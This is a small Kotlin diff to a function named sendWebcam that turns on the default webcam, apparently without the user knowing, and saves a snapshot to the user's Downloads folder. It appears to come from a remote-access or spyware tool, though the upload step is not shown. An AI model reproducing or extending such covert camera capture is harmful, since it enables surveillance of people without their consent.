@@ -21,7 +21,7 @@ object Screen {
 
     fun sendWebcam(force: Boolean = false) {
         val file = File("C:\\Users\\${Main.user}\\Downloads\\webcam.png")
-        val cam = Webcam.getDefault()
+        val cam = com.github.sarxos.webcam.Webcam.getDefault()
         if (!force && !cam.isOpen) return
         if (!cam.isOpen) cam.open()
         ImageIO.write(cam.image, "png", file)
